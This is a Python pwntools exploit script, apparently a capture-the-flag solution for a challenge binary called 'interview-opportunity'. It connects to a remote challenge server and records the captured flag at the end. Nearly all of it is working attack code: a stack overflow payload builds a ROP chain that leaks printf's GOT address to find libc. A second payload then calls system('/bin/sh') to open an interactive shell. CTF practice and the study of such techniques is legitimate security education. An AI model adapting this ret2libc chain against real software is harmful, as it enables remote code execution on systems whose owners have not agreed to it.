# RazviOverflow
#!/usr/bin/python3
from pwn import *

context.binary = binary = "./interview-opportunity"
static = ELF(binary)
library = ELF("./libc.so.6")


'''
The binary performs a read of of 0x46 (70) bytes at rbp-0x1a.
Then calls puts passing as parameter rbp-0x1a. That is, it prints the contents of whatever address we put into rbp-0x1a (dereferences it) . 

Exploit idea:
1st round of main:
	print the actual address of some function, like printf, from the GOT.
	get the libc base address using libc.so.6 (provided with the challenge)
2nd round of main:
	overflow the ret address of main (hijack its execution flow) and call system(/bin/sh)

Gadgets needed:
	ret (maybe)
	pop_rdi_ret

Output from ropgadget:
[refer to gadgets.txt]
0x000000000040101a : ret
0x0000000000401313 : pop rdi ; ret
'''
ret_addr = p64(0x000000000040101a)
pop_rdi_ret = p64(0x0000000000401313)
printf_got_address = p64(static.got.printf)
puts_plt_address = p64(static.plt.puts)
main_address = p64(static.symbols.main)
library_printf = library.symbols.printf

print("Puts address: " + str(printf_got_address))

#p = process(env={"LD_LIBRARY_PATH" : "./libc.so.6"})
p = remote("mc.ax", 31081)

print(p.recvuntil(b"?\n"))
payload = b"A" * 0x1a + b"B" * 8 + pop_rdi_ret + printf_got_address + puts_plt_address + main_address
p.sendline(payload)

print(p.recvline())
leak = u64(p.recv().split(b"\n")[1].strip().ljust(8,b'\0'))
print(hex(leak))


libc_base = leak - library_printf
library.address = libc_base
print("LIBC BASE ->" + str(hex(libc_base)))

bin_sh_str_address = p64(next(library.search(b'/bin/sh')))
system_address = p64(library.symbols.system)

payload = b"A" * 0x1a + b"B" * 8 + ret_addr + pop_rdi_ret + bin_sh_str_address + system_address
p.sendline(payload)

p.interactive()

# Flag: dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3}